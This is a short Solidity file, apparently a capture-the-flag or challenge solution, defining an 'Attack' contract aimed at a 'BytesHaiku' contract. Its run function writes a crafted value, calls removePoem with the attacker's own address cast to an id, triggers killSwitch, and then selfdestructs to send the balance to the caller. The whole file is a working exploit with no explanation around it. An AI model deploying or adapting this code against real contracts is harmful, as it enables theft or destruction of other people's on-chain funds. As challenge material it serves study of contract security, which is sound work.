// SPDX-License-Identifier: MIT

pragma solidity >= 0.8.0;

interface BytesHaiku {
    function writePoem(bytes32 _poem) external;
    function removePoem(uint256 id) external returns(bytes32);
    function killSwitch() external;
}

contract Attack {
    
    BytesHaiku private bh;

    constructor(address _address){
        bh = BytesHaiku(_address);
    }
    
    function run() external {
        bh.writePoem(0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa);
        bh.removePoem(uint256(uint160(bytes20(address(this)))));
        bh.killSwitch();
        selfdestruct(payable(msg.sender));
    }
}